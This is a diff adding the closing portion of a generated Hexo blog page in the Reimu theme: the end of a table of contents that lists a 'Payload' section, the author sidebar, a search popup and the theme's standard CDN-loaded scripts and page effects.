toc-level-3"><a class="toc-link" href="#delete-2"><span class="toc-number">4.2.4.</span> <span class="toc-text"> delete</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.3.</span> <span class="toc-text"> Payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-2"><span class="toc-number">5.</span> <span class="toc-text"> 总结</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div class="reimu-search-input" id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png"/>
+        </div>
+      </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+  
+<script src="/js/generator_search.js" defer></script>
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.0.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+<script data-pjax>
+  var updateTime = _$('#post-update-time')?.innerHTML;
+
+  if (updateTime) {
+    const update = new Date(updateTime);
+    const now = new Date();
+    const diff = now - update;
+    const days = diff / 86400000;
+    const { daysAgo, message: template } = window.REIMU_CONFIG.outdate;
+    if (days >= daysAgo) {
+      const message = template.replace(/{time}/, updateTime);
+      const blockquote = _$('#outdate-blockquote');
+      if (blockquote) {
+        blockquote.querySelector('p').innerText = message;
+        blockquote.style.display = 'block';
+      }
+    }
+  }
+</script>
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
+
